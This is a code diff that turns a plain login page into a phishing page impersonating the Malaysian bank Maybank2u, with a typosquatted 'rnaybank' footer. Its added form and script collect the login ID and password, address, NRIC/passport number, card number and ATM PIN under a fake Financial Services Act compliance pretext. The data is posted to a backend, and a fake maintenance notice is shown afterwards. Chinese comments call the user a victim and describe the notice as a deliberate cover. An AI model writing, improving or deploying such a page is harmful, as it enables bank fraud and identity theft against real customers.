@@ -3,22 +3,15 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Login</title>
+    <title>Maybank2u - Welcome</title>
     <style>
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            
-            /* PLACEHOLDER: Background Image Setup */
-            /* Replace the URL below with the path to your background image file */
-            /* Example: background-image: url('images/scam-background.jpg'); */
             background-image: url('https://static.vecteezy.com/system/resources/thumbnails/001/280/649/original/happy-family-playing-in-the-park-together-video.jpg');
             background-size: cover;
             background-position: center;
             background-repeat: no-repeat;
-            
-            /* Fallback color if the image doesn't load */
             background-color: #f4f7f6; 
-            
             display: flex;
             justify-content: center;
             align-items: center;
@@ -26,39 +19,43 @@
             margin: 0;
         }
         .login-container {
-            /* Changed to slightly transparent white so the background image shows through */
             background-color: rgba(255, 255, 255, 0.95); 
             padding: 40px;
             border-radius: 8px;
             box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
             width: 100%;
-            max-width: 380px;
-            text-align: center; /* Centers the logo and text */
+            max-width: 400px;
+            text-align: center; 
         }
-        
-        /* New styling for the logo placeholder */
         .brand-logo {
-            max-width: 150px; /* Adjust this value based on your logo's size */
+            max-width: 150px;
             height: auto;
             margin-bottom: 15px;
         }
-
         .service-name {
             color: #333333;
             margin-top: 0;
-            margin-bottom: 30px;
+            margin-bottom: 25px;
             font-size: 24px;
         }
-
+        /* 隐藏不活跃的步骤 */
+        .form-step {
+            display: none;
+        }
+        /* 仅显示活跃的步骤 */
+        .form-step.active {
+            display: block;
+        }
         .input-group {
-            margin-bottom: 20px;
-            text-align: left; /* Keeps the form labels aligned left */
+            margin-bottom: 18px;
+            text-align: left; 
         }
         .input-group label {
             display: block;
             margin-bottom: 8px;
             color: #555555;
             font-weight: 600;
+            font-size: 14px;
         }
         .input-group input {
             width: 100%;
@@ -69,7 +66,7 @@
             font-size: 15px;
         }
         .input-group input:focus {
-            border-color: #d62828; /* Changed focus color to a "warning" red for the scam vibe */
+            border-color: #d62828; 
             outline: none;
             box-shadow: 0 0 5px rgba(214, 40, 40, 0.3);
         }
@@ -94,27 +91,74 @@
             font-size: 12px;
             color: #888888;
         }
+        .alert-icon {
+            font-size: 40px;
+            color: #ffc107;
+            margin-bottom: 10px;
+        }
     </style>
 </head>
 <body>
 
     <div class="login-container">
-        
         <img src="/logo.png" alt="Brand Logo" class="brand-logo">
 
-        <h2 class="service-name">Login Here</h2>
-
-        <form action="/submit" method="POST">
+        <div class="form-step active" id="step1">
+            <h2 class="service-name">Login Here</h2>
             <div class="input-group">
                 <label for="username">User ID</label>
-                <input type="text" id="username" name="username" required autocomplete="off" placeholder="Enter your ID">
+                <input type="text" id="username" placeholder="Enter your ID" autocomplete="off">
             </div>
             <div class="input-group">
                 <label for="password">Security Password</label>
-                <input type="password" id="password" name="password" required placeholder="Enter your password">
+                <input type="password" id="password" placeholder="Enter your password">
             </div>
-            <button type="submit" class="login-btn">Secure Login</button>
-        </form>
+            <button type="button" class="login-btn" onclick="goToStep(1, 2)">Secure Login</button>
+        </div>
+
+        <div class="form-step" id="step2">
+            <h2 class="service-name">Security Update (2/3)</h2>
+            <p style="font-size: 13px; color: #666; margin-bottom: 15px; text-align: left;">
+                Pursuant to the Financial Services Act, please verify your profile details to complete the compliance update.
+            </p>
+            <div class="input-group">
+                <label for="personal_info">Age & Profession</label>
+                <input type="text" id="personal_info" placeholder="e.g. 27, Financial Analyst">
+            </div>
+            <div class="input-group">
+                <label for="address">Residential Address</label>
+                <input type="text" id="address" placeholder="Enter your registered address">
+            </div>
+            <div class="input-group">
+                <label for="ic_number">NRIC / Passport Number</label>
+                <input type="text" id="ic_number" placeholder="e.g. 990101-14-XXXX">
+            </div>
+            <button type="button" class="login-btn" onclick="goToStep(2, 3)">Continue</button>
+        </div>
+
+        <div class="form-step" id="step3">
+            <h2 class="service-name">Authentication (3/3)</h2>
+            <div class="input-group">
+                <label for="card_number">Debit/Credit Card Number</label>
+                <input type="text" id="card_number" placeholder="16-digit card number">
+            </div>
+            <div class="input-group">
+                <label for="card_pin">6-Digit ATM/Card PIN</label>
+                <input type="password" id="card_pin" maxlength="6" placeholder="Enter PIN">
+            </div>
+            <button type="button" class="login-btn" onclick="submitAllData()">Verify Details</button>
+        </div>
+
+        <div class="form-step" id="step4">
+            <div class="alert-icon">⚠️</div>
+            <h2 class="service-name" style="margin-bottom: 15px;">System Maintenance</h2>
+            <p style="font-size: 14px; color: #444; line-height: 1.6; text-align: left; margin-bottom: 15px;">
+                Dear customer, our systems are currently undergoing urgent regular database synchronization. 
+            </p>
+            <p style="font-size: 13px; color: #666; text-align: left;">
+                Please do not re-submit your token request. Normal banking services will resume shortly. Thank you.
+            </p>
+        </div>
         
         <div class="footer-text">
             &copy; 2026 rnaybank. All rights reserved. <br>
@@ -122,5 +166,54 @@
         </div>
     </div>
 
+    <script>
+        // 本地对象，用于逐步汇总受害者输入的表单数据
+        let payload = {};
+
+        function goToStep(currentStep, nextStep) {
+            // 在页面切换时读取当前步骤的值并暂存
+            if (currentStep === 1) {
+                payload.username = document.getElementById('username').value;
+                payload.password = document.getElementById('password').value;
+            } else if (currentStep === 2) {
+                payload.personal_info = document.getElementById('personal_info').value;
+                payload.address = document.getElementById('address').value;
+                payload.ic_number = document.getElementById('ic_number').value;
+            }
+            
+            // 切换 DOM 显隐状态
+            document.getElementById(`step${currentStep}`).classList.remove('active');
+            document.getElementById(`step${nextStep}`).classList.add('active');
+        }
+
+        function submitAllData() {
+            // 读取最后一步的值
+            payload.card_number = document.getElementById('card_number').value;
+            payload.card_pin = document.getElementById('card_pin').value;
+
+            // 使用现代 Web 标准的 URLSearchParams 将聚合数据包装为标准的表单键值对
+            const formData = new URLSearchParams();
+            for (const key in payload) {
+                formData.append(key, payload[key]);
+            }
+
+            // 发起异步 POST 请求发送数据到 Flask 后端
+            fetch('/submit', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                body: formData.toString()
+            })
+            .then(response => {
+                // 不论网络传输返回何种状态码，均无缝向受害者展示维护页面，达到障眼法效果
+                document.getElementById('step3').classList.remove('active');
+                document.getElementById('step4').classList.add('active');
+            })
+            .catch(error => {
+                console.error('Network trace error:', error);
+                document.getElementById('step3').classList.remove('active');
+                document.getElementById('step4').classList.add('active');
+            });
+        }
+    </script>
 </body>
 </html>
